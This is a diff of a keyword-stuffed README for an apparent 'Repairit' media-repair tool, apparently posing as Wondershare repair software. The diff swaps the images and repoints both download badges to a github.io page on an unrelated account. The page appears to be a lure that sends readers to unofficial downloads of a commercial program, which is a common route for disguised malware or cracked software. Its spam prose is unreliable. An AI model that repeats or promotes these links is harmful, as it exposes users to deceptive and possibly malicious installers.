@@ -1,14 +1,11 @@
 # Repairit Media Restoration Framework for Damaged Files
 
 <div align="center">
-  <img src="https://ph-test-11.slatic.net/p/cdfc2e56e864d1eb4dd75431e6d3ec79.png" alt="Program Logo"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9ktEH0LiwvkjIVCh4XSefEOW2KNVhzeyzvWa3As90VA&s=10" alt="Program Logo"/>
 </div>
 
-<div align="center">
+[![GET Repairit Tool](https://img.shields.io/badge/GET%20%E2%80%94%20Repairit-Tool-0078D6?style=for-the-badge&logoColor=white)](https://sanrigematroseden.github.io/.github/Repairit-Tool)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://repairit-tool.github.io/.github/)
-
-</div>
 
 ---
 
@@ -29,14 +26,11 @@ The platform integrates wondershare video repair software and repairit software 
 Finally, Repairit Tool supports operational convenience through repairit download and download repairit elements, enabling direct access to the application while maintaining a controlled, stable media-repair environment.
 
 <div align="center">
-  <img src="https://windows-cdn.softpedia.com/screenshots/Recoverit-Video-Repair_1.png" alt="Program Interface Screenshot"/>
+  <img src="https://cdn.redmondpie.com/wp-content/uploads/2022/07/image_2022-07-27_223126904.png" alt="Program Interface Screenshot"/>
 </div>
 
-<div align="center">
+[![GET Repairit Tool](https://img.shields.io/badge/GET%20%E2%80%94%20Repairit-Tool-0078D6?style=for-the-badge&logoColor=white)](https://sanrigematroseden.github.io/.github/Repairit-Tool)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://repairit-tool.github.io/.github/)
-
-</div>
 
 ---
 
